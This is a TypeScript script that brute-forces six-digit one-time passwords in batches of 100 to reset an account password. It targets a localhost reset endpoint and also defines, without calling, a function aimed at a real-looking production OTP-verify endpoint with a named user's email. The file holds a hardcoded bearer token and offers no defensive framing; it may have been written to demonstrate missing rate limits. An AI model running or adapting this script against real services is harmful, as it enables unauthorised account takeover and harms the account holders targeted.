import axios from  'axios';

async function sendRequestProduction(otp: number) {
    let config = {
      method: 'get',
      maxBodyLength: Infinity,
      url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=harkirat.iitr%40gmail.com&otp=' + otp,
      headers: { 
        'accept': '*/*', 
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
        'auth-key': 'appxapi', 
        'client-service': 'Appx', 
        'device-type': '', 
        'origin': 'https://harkirat.classx.co.in', 
        'priority': 'u=1, i', 
        'referer': 'https://harkirat.classx.co.in/', 
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', 
        'sec-ch-ua-mobile': '?0', 
        'sec-ch-ua-platform': '"macOS"', 
        'sec-fetch-dest': 'empty', 
        'sec-fetch-mode': 'cors', 
        'sec-fetch-site': 'same-site', 
        'source': 'website', 
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
      }
    };
  
    try {
      await axios.request(config);
    } catch (error) {
      console.error(error);
    }
  }
  

async function sendRequest(otp:string){
    let data = JSON.stringify({
        "email": "aditya@gmail.com",
        "otp": otp,
        "newPassword": "123453234"
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: { 
          'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NWY2MDJkNGU5NDI4Y2MxYjI4ZWM1ZDMiLCJpYXQiOjE3MTA2MjEzOTZ9.yfnPNjZYws1RDTY8EDLx6YLaGq6KFs1rWsVnWT9Hig8', 
          'Content-Type': 'application/json'
        },
        data : data
      };
      
      await axios.request(config)
      .then((response) => {
        console.log(JSON.stringify(response.data));
      })
      .catch((error) => {
        console.log(error);
      });
}
// for(let i=0;i<=999999;i++){
//     sendRequest(i.toString())
// }
//batching
async function main(){
    for(let i=0;i<=999999;i+=100){
        const promises=[]
        for(let j=0;j<100;j++){
            promises.push(sendRequest((i+j).toString()))
        }
        await Promise.all(promises)
    }
}
main()

